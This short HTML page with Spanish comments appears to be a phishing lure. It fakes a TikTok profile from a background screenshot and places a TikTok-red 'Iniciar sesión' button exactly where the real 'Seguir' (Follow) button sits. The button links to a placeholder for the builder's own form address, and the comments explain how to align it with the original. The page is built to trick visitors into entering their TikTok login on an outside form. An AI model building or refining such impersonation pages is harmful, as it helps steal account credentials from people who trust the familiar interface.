<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Perfil TikTok</title>

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

/* Tu fondo igual que tenías */
html {
  background: url("fondo.png") center top / cover no-repeat fixed !important;
  min-height: 100vh !important;
}
body {
  background: transparent !important;
  min-height: 100vh !important;
  position: relative;
}

/* ✅ TU BOTÓN EN EL LUGAR EXACTO DEL BOTÓN SEGUIR */
.boton-iniciar-sesion {
  position: absolute;
  top: 42%; /* Ajusta este valor si lo ves muy arriba/abajo */
  left: 50%;
  transform: translateX(-50%);
  width: 220px;
  padding: 13px 20px;
  background-color: #FF0050; /* Mismo color rojo que el botón de TikTok */
  color: white;
  border: none;
  border-radius: 999px;
  font-size: 18px;
  font-weight: bold;
  cursor: pointer;
  text-decoration: none;
  text-align: center;
}
</style>

</head>
<body>

<!-- ✅ Tu botón reemplazando al de Seguir -->
<a href="PON_AQUI_LA_DIRECCION_DE_TU_FORMULARIO" class="boton-iniciar-sesion">
  Iniciar sesión
</a>

</body>
</html>
